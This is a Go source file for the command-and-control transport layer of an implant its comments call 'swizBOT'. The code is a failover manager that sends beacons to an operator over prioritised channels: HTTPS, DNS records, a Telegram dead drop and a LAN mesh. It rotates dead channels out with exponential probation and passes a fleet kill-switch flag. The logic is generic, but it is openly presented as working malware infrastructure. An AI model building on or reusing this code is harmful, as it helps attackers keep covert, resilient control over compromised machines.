// Package transport is the layered fallback-comms backbone for the
// swizBOT implant.
//
// The implant talks to the operator through an ordered stack of channels
// (HTTPS endpoints, DNS records, a Telegram dead drop, a LAN mesh, ...).
// Each channel is a Layer. The Manager walks the stack in priority order,
// fails over on error, and keeps per-layer health so a dead channel is
// put on probation instead of being hammered on every beacon.
//
// Layers move opaque bytes. Encryption is the caller's job (or the
// layer's), so the same Manager carries AEAD frames, legacy
// XOR-obfuscated bodies, or cleartext in a lab without knowing which.
package transport

import (
	"context"
	"errors"
	"sort"
	"sync"
	"time"
)

// Sentinel errors. Layers return ErrUnsupported for an operation they do
// not implement (e.g. a receive-only DNS channel); the Manager then skips
// the layer without counting it as a failure.
var (
	ErrNoLayers    = errors.New("transport: no layers configured")
	ErrAllFailed   = errors.New("transport: every layer failed")
	ErrUnsupported = errors.New("transport: operation unsupported by layer")
)

// Frame is one wire payload returned by a poll. Sealed reports whether
// Body is an AEAD frame (true) or a cleartext JSON body (false, legacy
// lab mode) so the caller knows how to open it. Paused carries the fleet
// kill-switch signal when the channel exposes it (HTTP X-Paused).
type Frame struct {
	Body   []byte
	Sealed bool
	Paused bool
}

// Layer is a single comms channel in the fallback stack.
//
// Poll returns the next inbound frame: (Frame{}, nil) means the channel
// is healthy but has nothing queued, (Frame{}, err) means the channel
// failed. Push delivers one outbound frame.
type Layer interface {
	Name() string
	Priority() int
	Poll(ctx context.Context) (Frame, error)
	Push(ctx context.Context, frame []byte) error
}

// LayerStatus is a point-in-time health snapshot for observability.
type LayerStatus struct {
	Name          string
	Priority      int
	Healthy       bool
	Consecutive   int
	Successes     uint64
	Failures      uint64
	ProbationTill time.Time
	LastError     string
	LastOK        time.Time
}

type layerState struct {
	layer     Layer
	consec    int
	probUntil time.Time
	lastErr   error
	lastOK    time.Time
	ok        uint64
	fail      uint64
}

// Manager owns the ordered layer stack and its health state.
type Manager struct {
	mu     sync.Mutex
	states []*layerState
	now    func() time.Time

	failThreshold int
	probation     time.Duration
	maxProbation  time.Duration
}

// Option configures a Manager.
type Option func(*Manager)

// WithClock overrides the time source (tests).
func WithClock(now func() time.Time) Option { return func(m *Manager) { m.now = now } }

// WithProbation sets the consecutive-failure threshold that trips
// probation and the base probation duration.
func WithProbation(after int, d time.Duration) Option {
	return func(m *Manager) {
		if after > 0 {
			m.failThreshold = after
		}
		if d > 0 {
			m.probation = d
		}
	}
}

// WithMaxProbation caps the exponential probation backoff.
func WithMaxProbation(d time.Duration) Option {
	return func(m *Manager) {
		if d > 0 {
			m.maxProbation = d
		}
	}
}

// New builds a Manager over the given layers, ordered by ascending
// Priority (lower = tried first).
func New(layers []Layer, opts ...Option) *Manager {
	m := &Manager{
		now:           time.Now,
		failThreshold: 3,
		probation:     30 * time.Second,
		maxProbation:  30 * time.Minute,
	}
	for _, o := range opts {
		o(m)
	}
	for _, l := range layers {
		if l == nil {
			continue
		}
		m.states = append(m.states, &layerState{layer: l})
	}
	sort.SliceStable(m.states, func(i, j int) bool {
		return m.states[i].layer.Priority() < m.states[j].layer.Priority()
	})
	return m
}

// Names returns the layer names in priority order.
func (m *Manager) Names() []string {
	m.mu.Lock()
	defer m.mu.Unlock()
	out := make([]string, len(m.states))
	for i, s := range m.states {
		out[i] = s.layer.Name()
	}
	return out
}

// Poll returns the first inbound frame from the highest-priority healthy
// layer. ErrAllFailed means every layer either errored or was skipped.
func (m *Manager) Poll(ctx context.Context) (Frame, string, error) {
	m.mu.Lock()
	states := append([]*layerState(nil), m.states...)
	m.mu.Unlock()
	if len(states) == 0 {
		return Frame{}, "", ErrNoLayers
	}
	for _, s := range states {
		if m.inProbation(s) {
			continue
		}
		f, err := s.layer.Poll(ctx)
		if errors.Is(err, ErrUnsupported) {
			continue
		}
		if err != nil {
			m.markFail(s, err)
			continue
		}
		m.markOK(s)
		return f, s.layer.Name(), nil
	}
	return Frame{}, "", ErrAllFailed
}

// Push delivers a frame through the first healthy layer that accepts it.
func (m *Manager) Push(ctx context.Context, frame []byte) (string, error) {
	m.mu.Lock()
	states := append([]*layerState(nil), m.states...)
	m.mu.Unlock()
	if len(states) == 0 {
		return "", ErrNoLayers
	}
	for _, s := range states {
		if m.inProbation(s) {
			continue
		}
		err := s.layer.Push(ctx, frame)
		if errors.Is(err, ErrUnsupported) {
			continue
		}
		if err != nil {
			m.markFail(s, err)
			continue
		}
		m.markOK(s)
		return s.layer.Name(), nil
	}
	return "", ErrAllFailed
}

// Status snapshots per-layer health, in priority order.
func (m *Manager) Status() []LayerStatus {
	m.mu.Lock()
	defer m.mu.Unlock()
	out := make([]LayerStatus, 0, len(m.states))
	for _, s := range m.states {
		st := LayerStatus{
			Name:          s.layer.Name(),
			Priority:      s.layer.Priority(),
			Consecutive:   s.consec,
			Successes:     s.ok,
			Failures:      s.fail,
			ProbationTill: s.probUntil,
			LastOK:        s.lastOK,
			Healthy:       s.consec < m.failThreshold && !m.probationActive(s),
		}
		if s.lastErr != nil {
			st.LastError = s.lastErr.Error()
		}
		out = append(out, st)
	}
	return out
}

func (m *Manager) probationActive(s *layerState) bool {
	return !s.probUntil.IsZero() && m.now().Before(s.probUntil)
}

func (m *Manager) inProbation(s *layerState) bool {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.probationActive(s)
}

func (m *Manager) markOK(s *layerState) {
	m.mu.Lock()
	defer m.mu.Unlock()
	s.consec = 0
	s.probUntil = time.Time{}
	s.lastOK = m.now()
	s.ok++
}

func (m *Manager) markFail(s *layerState, err error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	s.consec++
	s.fail++
	s.lastErr = err
	if s.consec >= m.failThreshold {
		// exponential probation: base * 2^(over-threshold), capped
		over := s.consec - m.failThreshold
		if over > 20 {
			over = 20
		}
		d := m.probation << uint(over)
		if d <= 0 || d > m.maxProbation {
			d = m.maxProbation
		}
		s.probUntil = m.now().Add(d)
	}
}
